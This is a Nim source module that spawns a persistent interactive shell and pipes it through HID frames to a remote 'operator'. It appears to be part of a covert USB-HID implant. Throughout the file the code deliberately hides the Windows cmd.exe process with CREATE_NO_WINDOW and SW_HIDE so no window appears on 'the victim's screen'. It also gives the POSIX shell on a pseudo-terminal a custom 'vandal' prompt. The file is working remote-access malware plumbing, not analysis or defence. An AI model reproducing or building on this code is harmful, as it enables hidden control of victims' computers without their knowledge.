## Persistent OS shell child process. Stdin/stdout are byte streams
## the pump module marshals into HID frames.
##
## POSIX (Linux/macOS): the shell is spawned on a pseudo-terminal so
## bash/zsh consider stdout to be a TTY and switch to line-buffered
## mode. Without a PTY the child buffers output by 4-8 KiB blocks and
## the operator only sees results once enough bytes have accumulated
## (or on SIGINT). A PTY also unlocks colours, readline editing, and
## full-screen tools (`less`, `vi`, `top`).
##
## Windows: we bypass `std/osproc` entirely because:
##   1. `startProcess` does not pass `CREATE_NO_WINDOW` to
##      CreateProcessW, so the console subsystem child (`cmd.exe`) gets
##      a brand-new visible console allocated by Windows whenever the
##      parent (`sw.exe`, built `--app:gui`) has none. That leaks a
##      stray prompt-less terminal window on the victim's screen.
##   2. Nim's pipe-backed `Stream.readData` on Windows is blocking,
##      which deadlocks our single-threaded pump as soon as `cmd.exe`
##      has nothing more to say.
## We therefore drive CreateProcessW directly with `CREATE_NO_WINDOW`,
## hidden STARTUPINFO, and inheritable anonymous pipes; reads use
## `PeekNamedPipe` to stay strictly non-blocking. A future revision
## can swap the cmd.exe + pipe pair for ConPTY for colour / readline
## parity with POSIX.

import std/os

when defined(windows):
  import std/widestrs
else:
  import std/posix

type
  ShellChild* = ref object
    when defined(windows):
      hProcess*: pointer    ## process handle
      hThread*: pointer     ## main thread handle (closed asap)
      hStdinW*: pointer     ## our end of child stdin (we write)
      hStdoutR*: pointer    ## our end of child stdout (we read)
    else:
      pid*: Pid
      master*: cint   ## PTY master fd (bidirectional)

# ---------------------------------------------------------------------------
# Windows: direct Win32 FFI (no console window, non-blocking pipe reads)
# ---------------------------------------------------------------------------

when defined(windows):
  type
    DWORD     = uint32
    BOOL      = int32
    HANDLE    = pointer
    WORD      = uint16

    SECURITY_ATTRIBUTES {.bycopy.} = object
      nLength*: DWORD
      lpSecurityDescriptor*: pointer
      bInheritHandle*: BOOL

    STARTUPINFOW {.bycopy.} = object
      cb*: DWORD
      lpReserved*: WideCString
      lpDesktop*: WideCString
      lpTitle*: WideCString
      dwX*, dwY*, dwXSize*, dwYSize*: DWORD
      dwXCountChars*, dwYCountChars*, dwFillAttribute*: DWORD
      dwFlags*: DWORD
      wShowWindow*: WORD
      cbReserved2*: WORD
      lpReserved2*: pointer
      hStdInput*, hStdOutput*, hStdError*: HANDLE

    PROCESS_INFORMATION {.bycopy.} = object
      hProcess*, hThread*: HANDLE
      dwProcessId*, dwThreadId*: DWORD

  const
    HANDLE_FLAG_INHERIT      : DWORD = 0x00000001
    CREATE_NO_WINDOW         : DWORD = 0x08000000
    CREATE_UNICODE_ENVIRONMENT: DWORD = 0x00000400
    STARTF_USESTDHANDLES     : DWORD = 0x00000100
    STARTF_USESHOWWINDOW     : DWORD = 0x00000001
    SW_HIDE                  : WORD  = 0
    INFINITE                 : DWORD = 0xFFFFFFFF'u32
    STILL_ACTIVE             : DWORD = 259

  proc CreatePipe(hReadPipe, hWritePipe: ptr HANDLE,
                  lpPipeAttributes: ptr SECURITY_ATTRIBUTES,
                  nSize: DWORD): BOOL
    {.stdcall, importc, dynlib: "kernel32".}
  proc SetHandleInformation(hObject: HANDLE, dwMask, dwFlags: DWORD): BOOL
    {.stdcall, importc, dynlib: "kernel32".}
  proc CreateProcessW(lpApplicationName: WideCString,
                      lpCommandLine: WideCString,
                      lpProcessAttributes, lpThreadAttributes: ptr SECURITY_ATTRIBUTES,
                      bInheritHandles: BOOL,
                      dwCreationFlags: DWORD,
                      lpEnvironment: pointer,
                      lpCurrentDirectory: WideCString,
                      lpStartupInfo: ptr STARTUPINFOW,
                      lpProcessInformation: ptr PROCESS_INFORMATION): BOOL
    {.stdcall, importc, dynlib: "kernel32".}
  proc CloseHandle(h: HANDLE): BOOL
    {.stdcall, importc, dynlib: "kernel32".}
  proc PeekNamedPipe(hNamedPipe: HANDLE, lpBuffer: pointer, nBufferSize: DWORD,
                     lpBytesRead, lpTotalBytesAvail, lpBytesLeftThisMessage: ptr DWORD): BOOL
    {.stdcall, importc, dynlib: "kernel32".}
  proc ReadFile(hFile: HANDLE, lpBuffer: pointer, nNumberOfBytesToRead: DWORD,
                lpNumberOfBytesRead: ptr DWORD, lpOverlapped: pointer): BOOL
    {.stdcall, importc, dynlib: "kernel32".}
  proc WriteFile(hFile: HANDLE, lpBuffer: pointer, nNumberOfBytesToWrite: DWORD,
                 lpNumberOfBytesWritten: ptr DWORD, lpOverlapped: pointer): BOOL
    {.stdcall, importc, dynlib: "kernel32".}
  proc GetExitCodeProcess(hProcess: HANDLE, lpExitCode: ptr DWORD): BOOL
    {.stdcall, importc, dynlib: "kernel32".}
  proc TerminateProcess(hProcess: HANDLE, uExitCode: DWORD): BOOL
    {.stdcall, importc, dynlib: "kernel32".}
  proc WaitForSingleObject(hHandle: HANDLE, dwMilliseconds: DWORD): DWORD
    {.stdcall, importc, dynlib: "kernel32".}
  proc GetLastError(): DWORD
    {.stdcall, importc, dynlib: "kernel32".}

  proc spawnShellWindows(): ShellChild =
    result = ShellChild()

    var sa = SECURITY_ATTRIBUTES(
      nLength: DWORD(sizeof(SECURITY_ATTRIBUTES)),
      lpSecurityDescriptor: nil,
      bInheritHandle: 1,    # pipe ends inheritable by default; we
                            # clear the parent ends right after.
    )

    # Child stdin pipe: child reads from `hStdinR`, parent writes to `hStdinW`.
    var hStdinR, hStdinW: HANDLE
    if CreatePipe(addr hStdinR, addr hStdinW, addr sa, 0) == 0:
      raise newException(OSError,
        "CreatePipe(stdin) failed: " & $GetLastError())
    discard SetHandleInformation(hStdinW, HANDLE_FLAG_INHERIT, 0)

    # Child stdout/stderr pipe: child writes `hStdoutW`, parent reads `hStdoutR`.
    var hStdoutR, hStdoutW: HANDLE
    if CreatePipe(addr hStdoutR, addr hStdoutW, addr sa, 0) == 0:
      discard CloseHandle(hStdinR); discard CloseHandle(hStdinW)
      raise newException(OSError,
        "CreatePipe(stdout) failed: " & $GetLastError())
    discard SetHandleInformation(hStdoutR, HANDLE_FLAG_INHERIT, 0)

    var si = STARTUPINFOW(cb: DWORD(sizeof(STARTUPINFOW)))
    si.dwFlags = STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW
    si.wShowWindow = SW_HIDE
    si.hStdInput  = hStdinR
    si.hStdOutput = hStdoutW
    si.hStdError  = hStdoutW    # merge stderr into stdout

    var pi: PROCESS_INFORMATION

    # `/Q` silences echo, `/K` keeps the shell alive for subsequent
    # commands. We don't set `@echo off` here because /Q already does
    # it and an explicit command would surface in the output stream.
    let cmdLine = newWideCString(r"cmd.exe /Q /K")

    let ok = CreateProcessW(
      lpApplicationName = nil,
      lpCommandLine     = cmdLine,
      lpProcessAttributes = nil,
      lpThreadAttributes  = nil,
      bInheritHandles = 1,
      # CREATE_NO_WINDOW is what actually suppresses the console window
      # Windows would otherwise allocate for cmd.exe (Console subsystem
      # child of a GUI subsystem parent).
      dwCreationFlags = CREATE_NO_WINDOW or CREATE_UNICODE_ENVIRONMENT,
      lpEnvironment    = nil,
      lpCurrentDirectory = nil,
      lpStartupInfo      = addr si,
      lpProcessInformation = addr pi,
    )

    # Always close the child-side handles in the parent — keeping them
    # would prevent EOF detection when cmd.exe exits.
    discard CloseHandle(hStdinR)
    discard CloseHandle(hStdoutW)

    if ok == 0:
      discard CloseHandle(hStdinW); discard CloseHandle(hStdoutR)
      raise newException(OSError,
        "CreateProcessW(cmd.exe) failed: " & $GetLastError())

    result.hProcess = pi.hProcess
    result.hThread  = pi.hThread
    result.hStdinW  = hStdinW
    result.hStdoutR = hStdoutR

# ---------------------------------------------------------------------------
# POSIX PTY implementation
# ---------------------------------------------------------------------------

when not defined(windows):
  # libc helpers not exposed by std/posix in older Nim releases.
  proc posix_openpt(flags: cint): cint {.importc, header: "<stdlib.h>".}
  proc grantpt(fd: cint): cint {.importc, header: "<stdlib.h>".}
  proc unlockpt(fd: cint): cint {.importc, header: "<stdlib.h>".}
  proc ptsname(fd: cint): cstring {.importc, header: "<stdlib.h>".}
  proc setsid(): Pid {.importc, header: "<unistd.h>".}
  proc ioctl(fd: cint, request: culong): cint {.importc, header: "<sys/ioctl.h>", varargs.}
  proc c_setenv(name, value: cstring, overwrite: cint): cint {.importc: "setenv", header: "<stdlib.h>".}

  # TIOCSCTTY differs across kernels; on Linux it is 0x540E.
  when defined(linux):
    const TIOCSCTTY = 0x540E.culong
  elif defined(macosx):
    const TIOCSCTTY = 0x20007461.culong
  else:
    const TIOCSCTTY = 0x540E.culong

  proc setNonBlocking(fd: cint) =
    let flags = fcntl(fd, F_GETFL, 0)
    if flags != -1:
      discard fcntl(fd, F_SETFL, flags or O_NONBLOCK)

  proc spawnShellPosix(): ShellChild =
    result = ShellChild()
    let master = posix_openpt(O_RDWR or O_NOCTTY)
    if master < 0:
      raise newException(OSError, "posix_openpt failed: " & $strerror(errno))
    if grantpt(master) != 0:
      discard close(master)
      raise newException(OSError, "grantpt failed: " & $strerror(errno))
    if unlockpt(master) != 0:
      discard close(master)
      raise newException(OSError, "unlockpt failed: " & $strerror(errno))
    let slaveName = $ptsname(master)

    let pid = fork()
    if pid < 0:
      discard close(master)
      raise newException(OSError, "fork failed: " & $strerror(errno))

    if pid == 0:
      # Child: detach from parent's controlling TTY, attach to the slave.
      discard setsid()
      let slave = open(slaveName.cstring, O_RDWR)
      if slave < 0:
        quit(127)
      discard ioctl(slave, TIOCSCTTY, 0)
      discard dup2(slave, 0)
      discard dup2(slave, 1)
      discard dup2(slave, 2)
      if slave > 2:
        discard close(slave)
      discard close(master)

      # Reasonable defaults so prompts render correctly.
      discard c_setenv(cstring"TERM", cstring"xterm-256color", 1)
      # Override PS1 so the visible prompt is short, deterministic and
      # does not leak the host's bash startup customisations (which may
      # include long git/conda decorators, ANSI heavy renderers like
      # starship, or multi-line prompts that fight with xterm.js
      # cursor tracking).
      discard c_setenv(cstring"PS1", cstring"\\u@vandal:\\w\\$ ", 1)

      let shell = getEnv("SHELL", "/bin/bash")
      # `-i` keeps the shell interactive (PS1, history, job control).
      # `--norc` (bash-only flag, ignored as harmless arg by sh) skips
      # ~/.bashrc so our PS1 env var is not overwritten by the user's
      # customisations and we get a deterministic prompt for xterm.js.
      let argv = allocCStringArray([shell, "--norc", "-i"])
      discard execv(shell.cstring, argv)
      # If execv returns, fall back to /bin/sh.
      let fallback = allocCStringArray(["/bin/sh", "-i"])
      discard execv("/bin/sh", fallback)
      quit(127)

    # Parent
    setNonBlocking(master)
    result.pid = pid
    result.master = master

# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

proc spawnShell*(): ShellChild =
  when defined(windows):
    return spawnShellWindows()
  else:
    return spawnShellPosix()

proc writeBytes*(c: ShellChild, data: openArray[uint8]) =
  if data.len == 0:
    return
  when defined(windows):
    # Line-terminator normalisation. xterm.js (and any sensible web
    # terminal emulator) sends a lone CR (0x0D) when the user presses
    # Enter — that's what a POSIX TTY expects. cmd.exe driven through
    # a pipe (no console) only commits a line once it sees `\r\n` or
    # `\n`; a bare CR is buffered indefinitely and the command never
    # runs (and never echoes). We translate every lone CR into CRLF
    # in-flight; an existing CRLF is passed through untouched.
    var norm = newSeqOfCap[uint8](data.len + 4)
    var i = 0
    while i < data.len:
      let b = data[i]
      norm.add b
      if b == 0x0D'u8 and (i + 1 >= data.len or data[i + 1] != 0x0A'u8):
        norm.add 0x0A'u8
      inc i

    # WriteFile on an anonymous pipe blocks only if the kernel pipe
    # buffer is full (~64 KiB). For interactive command bytes we are
    # well below that; treat short writes as fatal-enough to log but
    # not fatal enough to crash — the pump's next iteration retries.
    var off: uint32 = 0
    while int(off) < norm.len:
      var written: uint32 = 0
      let remaining = uint32(norm.len - int(off))
      let ok = WriteFile(c.hStdinW,
                         unsafeAddr norm[int(off)],
                         remaining, addr written, nil)
      if ok == 0 or written == 0:
        break
      off += written
  else:
    var off = 0
    while off < data.len:
      let n = write(c.master, unsafeAddr data[off], (data.len - off).cint)
      if n > 0:
        off += n
      elif n < 0 and errno == EINTR:
        continue
      else:
        # EAGAIN on a saturated PTY: bail; caller will retry next loop.
        break

proc tryReadBytes*(c: ShellChild, buf: var seq[uint8], maxBytes: int): int =
  ## Non-blocking read. Returns 0 if no data is currently available.
  buf.setLen(maxBytes)
  when defined(windows):
    # PeekNamedPipe tells us how many bytes are buffered without
    # consuming them, turning ReadFile into a guaranteed non-blocking
    # operation. Without this dance, ReadFile on an anonymous pipe
    # blocks until at least one byte arrives — which freezes our
    # single-threaded pump.
    var avail: uint32 = 0
    let peeked = PeekNamedPipe(c.hStdoutR, nil, 0, nil, addr avail, nil)
    if peeked == 0:
      # Pipe broken (child likely exited): return 0; isAlive() will
      # flip on the next pump iteration.
      buf.setLen(0)
      return 0
    if avail == 0:
      buf.setLen(0)
      return 0
    let want = uint32(min(maxBytes, int(avail)))
    var got: uint32 = 0
    let ok = ReadFile(c.hStdoutR, addr buf[0], want, addr got, nil)
    if ok == 0 or got == 0:
      buf.setLen(0)
      return 0
    buf.setLen(int(got))
    return int(got)
  else:
    let n = read(c.master, addr buf[0], maxBytes.cint)
    if n > 0:
      buf.setLen(n)
      return n
    if n < 0 and (errno == EAGAIN or errno == EWOULDBLOCK or errno == EINTR):
      buf.setLen(0)
      return 0
    # n == 0 (EOF) or hard error: treat as no data; isAlive() will flip.
    buf.setLen(0)
    return 0

proc isAlive*(c: ShellChild): bool =
  when defined(windows):
    if c.hProcess == nil:
      return false
    var code: uint32 = 0
    if GetExitCodeProcess(c.hProcess, addr code) == 0:
      return false
    return code == STILL_ACTIVE
  else:
    if c.pid <= 0:
      return false
    # waitpid(WNOHANG) — returns 0 if still running.
    var status: cint
    let r = waitpid(c.pid, status, WNOHANG)
    return r == 0

proc terminate*(c: ShellChild) =
  when defined(windows):
    if c.hProcess != nil:
      # Closing stdin lets cmd.exe exit cleanly on EOF; give it a
      # short grace period before nuking it.
      if c.hStdinW != nil:
        discard CloseHandle(c.hStdinW); c.hStdinW = nil
      if WaitForSingleObject(c.hProcess, 500) != 0:
        discard TerminateProcess(c.hProcess, 1)
        discard WaitForSingleObject(c.hProcess, 500)
      discard CloseHandle(c.hProcess); c.hProcess = nil
      if c.hThread != nil:
        discard CloseHandle(c.hThread); c.hThread = nil
      if c.hStdoutR != nil:
        discard CloseHandle(c.hStdoutR); c.hStdoutR = nil
  else:
    if c.pid > 0:
      discard kill(c.pid, SIGTERM)
      var status: cint
      # Give it 500 ms to exit cleanly, then SIGKILL.
      for _ in 0 ..< 50:
        if waitpid(c.pid, status, WNOHANG) != 0:
          break
        os.sleep(10)
      if waitpid(c.pid, status, WNOHANG) == 0:
        discard kill(c.pid, SIGKILL)
        discard waitpid(c.pid, status, 0)
      c.pid = -1
    if c.master >= 0:
      discard close(c.master)
      c.master = -1
